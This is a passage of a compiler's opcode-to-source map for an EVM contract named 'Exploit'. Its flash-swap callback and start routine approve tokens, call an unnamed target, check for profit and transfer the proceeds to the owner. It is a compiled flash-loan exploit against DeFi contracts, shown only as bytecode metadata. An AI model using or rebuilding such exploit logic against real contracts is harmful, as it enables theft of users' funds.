      "op": "JUMPI",
      "path": "0"
    },
    "1215": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1217": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1218": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "1222": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "1224": {
      "op": "SHL"
    },
    "1225": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1226": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1227": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1229": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1231": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1232": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "ADD",
      "path": "0"
    },
    "1233": {
      "op": "MSTORE"
    },
    "1234": {
      "op": "PUSH1",
      "value": "0x11"
    },
    "1236": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1238": {
      "op": "DUP3"
    },
    "1239": {
      "op": "ADD"
    },
    "1240": {
      "op": "MSTORE"
    },
    "1241": {
      "op": "PUSH17",
      "value": "0x1B9BDD081B585ADA5B99C81C1C9BDA599D"
    },
    "1259": {
      "op": "PUSH1",
      "value": "0x7A"
    },
    "1261": {
      "op": "SHL"
    },
    "1262": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1264": {
      "op": "DUP3"
    },
    "1265": {
      "op": "ADD"
    },
    "1266": {
      "op": "MSTORE"
    },
    "1267": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "1269": {
      "op": "ADD"
    },
    "1270": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1271": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1273": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1274": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1275": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1276": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "SUB",
      "path": "0"
    },
    "1277": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1278": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1279": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3830,
        3902
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1280": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3916
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 5,
      "value": "0x2"
    },
    "1282": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3916
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1283": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1285": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1286": {
      "op": "PUSH4",
      "value": "0xA9059CBB"
    },
    "1291": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1293": {
      "op": "SHL"
    },
    "1294": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1295": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1296": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3926,
        3936
      ],
      "op": "CALLER",
      "path": "0"
    },
    "1297": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1299": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1300": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "ADD",
      "path": "0"
    },
    "1301": {
      "op": "MSTORE"
    },
    "1302": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1304": {
      "op": "DUP2"
    },
    "1305": {
      "op": "ADD"
    },
    "1306": {
      "op": "DUP4"
    },
    "1307": {
      "op": "SWAP1"
    },
    "1308": {
      "op": "MSTORE"
    },
    "1309": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1311": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1313": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1315": {
      "op": "SHL"
    },
    "1316": {
      "op": "SUB"
    },
    "1317": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3916
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1318": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3916
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1319": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3916
      ],
      "op": "AND",
      "path": "0"
    },
    "1320": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3916
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1321": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3925
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "1326": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3925
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1327": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1329": {
      "op": "ADD"
    },
    "1330": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1332": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1334": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1335": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1336": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1337": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "SUB",
      "path": "0"
    },
    "1338": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1339": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1341": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP8",
      "path": "0"
    },
    "1342": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "GAS",
      "path": "0"
    },
    "1343": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "CALL",
      "path": "0"
    },
    "1344": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1345": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1346": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1347": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x550"
    },
    "1350": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1351": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1352": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1354": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1355": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1356": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1357": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1359": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1360": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1361": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "POP",
      "path": "0"
    },
    "1362": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "POP",
      "path": "0"
    },
    "1363": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "POP",
      "path": "0"
    },
    "1364": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "POP",
      "path": "0"
    },
    "1365": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1367": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1368": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1369": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1371": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "NOT",
      "path": "0"
    },
    "1372": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1374": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1375": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "ADD",
      "path": "0"
    },
    "1376": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "AND",
      "path": "0"
    },
    "1377": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1378": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "ADD",
      "path": "0"
    },
    "1379": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1380": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1382": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1383": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "POP",
      "path": "0"
    },
    "1384": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1385": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "ADD",
      "path": "0"
    },
    "1386": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1387": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x574"
    },
    "1390": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1391": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1392": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14DF"
    },
    "1395": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3912,
        3948
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1396": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1397": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3912,
        3948
      ],
      "op": "POP",
      "path": "0"
    },
    "1398": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2916,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1399": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2916,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1400": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1401": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1402": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1403": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1404": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        2811,
        3955
      ],
      "op": "POP",
      "path": "0"
    },
    "1405": {
      "fn": "Exploit.pancakeCall",
      "jump": "o",
      "offset": [
        2811,
        3955
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1406": {
      "fn": "Exploit.start",
      "offset": [
        1860,
        2233
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1407": {
      "offset": [
        1772,
        1777
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1409": {
      "fn": "Exploit.start",
      "offset": [
        1772,
        1777
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1410": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1412": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1414": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1416": {
      "op": "SHL"
    },
    "1417": {
      "op": "SUB"
    },
    "1418": {
      "offset": [
        1772,
        1777
      ],
      "op": "AND",
      "path": "0"
    },
    "1419": {
      "offset": [
        1758,
        1768
      ],
      "op": "CALLER",
      "path": "0"
    },
    "1420": {
      "offset": [
        1758,
        1777
      ],
      "op": "EQ",
      "path": "0"
    },
    "1421": {
      "offset": [
        1750,
        1805
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x5D8"
    },
    "1424": {
      "offset": [
        1750,
        1805
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1425": {
      "fn": "Exploit.start",
      "offset": [
        1750,
        1805
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1427": {
      "fn": "Exploit.start",
      "offset": [
        1750,
        1805
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1428": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "1432": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "1434": {
      "op": "SHL"
    },
    "1435": {
      "offset": [
        1750,
        1805
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1436": {
      "fn": "Exploit.start",
      "offset": [
        1750,
        1805
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1437": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1439": {
      "offset": [
        1750,
        1805
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1441": {
      "fn": "Exploit.start",
      "offset": [
        1750,
        1805
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1442": {
      "fn": "Exploit.start",
      "offset": [
        1750,
        1805
      ],
      "op": "ADD",
      "path": "0"
    },
    "1443": {
      "op": "MSTORE"
    },
    "1444": {
      "op": "PUSH1",
      "value": "0x17"
    },
    "1446": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1448": {
      "op": "DUP3"
    },
    "1449": {
      "op": "ADD"
    },
    "1450": {
      "op": "MSTORE"
    },
    "1451": {
      "op": "PUSH32",
      "value": "0x43616C6C6572206973206E6F7420746865206F776E6572000000000000000000"
    },
    "1484": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1486": {
      "op": "DUP3"
    },
    "1487": {
      "op": "ADD"
    },
    "1488": {
      "op": "MSTORE"
    },
    "1489": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "1491": {
      "op": "ADD"
    },
    "1492": {
      "offset": [
        1750,
        1805
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x4F6"
    },
    "1495": {
      "op": "JUMP"
    },
    "1496": {
      "offset": [
        1750,
        1805
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1497": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1908
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 6,
      "value": "0x2"
    },
    "1499": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1908
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1500": {
      "fn": "Exploit.start",
      "offset": [
        1925,
        1931
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x5"
    },
    "1502": {
      "fn": "Exploit.start",
      "offset": [
        1925,
        1931
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1503": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1505": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1506": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "1511": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1513": {
      "op": "SHL"
    },
    "1514": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1515": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1516": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1518": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1520": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1522": {
      "op": "SHL"
    },
    "1523": {
      "op": "SUB"
    },
    "1524": {
      "fn": "Exploit.start",
      "offset": [
        1925,
        1931
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1525": {
      "fn": "Exploit.start",
      "offset": [
        1925,
        1931
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1526": {
      "fn": "Exploit.start",
      "offset": [
        1925,
        1931
      ],
      "op": "AND",
      "path": "0"
    },
    "1527": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1529": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1530": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "ADD",
      "path": "0"
    },
    "1531": {
      "op": "MSTORE"
    },
    "1532": {
      "fn": "Exploit.start",
      "offset": [
        1934,
        1938
      ],
      "op": "PUSH8",
      "path": "0",
      "value": "0xDE0B6B3A7640000"
    },
    "1541": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1543": {
      "op": "DUP3"
    },
    "1544": {
      "op": "ADD"
    },
    "1545": {
      "op": "MSTORE"
    },
    "1546": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1908
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1547": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1908
      ],
      "op": "AND",
      "path": "0"
    },
    "1548": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1908
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1549": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1916
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x95EA7B3"
    },
    "1554": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1916
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1555": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1557": {
      "op": "ADD"
    },
    "1558": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1560": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1562": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1563": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1564": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1565": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "SUB",
      "path": "0"
    },
    "1566": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1567": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1569": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP8",
      "path": "0"
    },
    "1570": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1571": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "1572": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1573": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1574": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1575": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x62F"
    },
    "1578": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1579": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1581": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1582": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1583": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1584": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "POP",
      "path": "0"
    },
    "1585": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "GAS",
      "path": "0"
    },
    "1586": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "CALL",
      "path": "0"
    },
    "1587": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1588": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1589": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1590": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x643"
    },
    "1593": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1594": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1595": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1597": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1598": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1599": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1600": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1602": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1603": {
      "fn": "Exploit.start",
      "offset": [
        1904,
        1939
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1604": {
      "op": "POP"
    },
    "1605": {
      "op": "POP"
    },
    "1606": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1955
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 7,
      "value": "0x5"
    },
    "1608": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        1955
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1609": {
      "fn": "Exploit.start",
      "offset": [
        1975,
        1979
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "1611": {
      "fn": "Exploit.start",
      "offset": [
        1975,
        1979
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1612": {
      "fn": "Exploit.start",
      "offset": [
        1996,
        2011
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x6"
    },
    "1614": {
      "fn": "Exploit.start",
      "offset": [
        1996,
        2011
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1615": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1617": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1618": {
      "op": "PUSH4",
      "value": "0x1C4009F9"
    },
    "1623": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1625": {
      "op": "SHL"
    },
    "1626": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1627": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1628": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1630": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1632": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1634": {
      "op": "SHL"
    },
    "1635": {
      "op": "SUB"
    },
    "1636": {
      "fn": "Exploit.start",
      "offset": [
        1975,
        1979
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "1637": {
      "fn": "Exploit.start",
      "offset": [
        1975,
        1979
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1638": {
      "fn": "Exploit.start",
      "offset": [
        1975,
        1979
      ],
      "op": "AND",
      "path": "0"
    },
    "1639": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1641": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1642": {
      "fn": "Exploit.start",
      "offset": [
        1949,
        2013
      ],
      "op": "ADD",
      "path": "0"
    },
    "1643": {
      "op": "MSTORE"
    },
    "1644": {
      "fn": "Exploit.start",
      "offset": [
        1982,
        1986
      ],
      "op": "PUSH8",
      "path": "0",
      "value": "0xDE0B6B3A7640000"
    },
    "1653": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1655": {
      "op": "DUP3"
    },
    "1656": {
      "op": "ADD"
    },
    "1657": {
      "op": "MSTORE"
    },
    "1658": {
      "fn": "Exploit.start",
      "offset": [
        1996,
        2011
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1659": {
      "fn": "Exploit.start",
      "offset": [
        1996,
        2011
      ],
      "op": "DUP3",
